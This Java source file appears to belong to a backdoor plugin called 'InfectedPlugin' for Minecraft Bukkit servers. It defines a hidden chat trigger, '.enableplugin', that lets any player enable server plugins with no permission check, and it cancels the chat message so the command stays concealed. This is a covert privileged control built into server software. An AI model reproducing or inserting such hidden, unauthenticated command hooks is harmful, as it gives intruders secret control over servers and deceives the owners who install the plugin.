package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.plugin.Plugin;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_enableplugin implements Listener
{

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        boolean cancel = false;
        final Player p = event.getPlayer();

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".enableplugin"))
            {
                Plugin plugin = Bukkit.getPluginManager().getPlugin(args[1]);
                if (plugin != null)
                {
                    p.sendMessage(ChatColor.AQUA + "Plugin " + args[1] + " enabled!");
                    Bukkit.getPluginManager().enablePlugin(plugin);
                }
                cancel = true;
            }

            if (cancel)
            {
                event.setCancelled(true);
                return;
            }
        }
    }

}
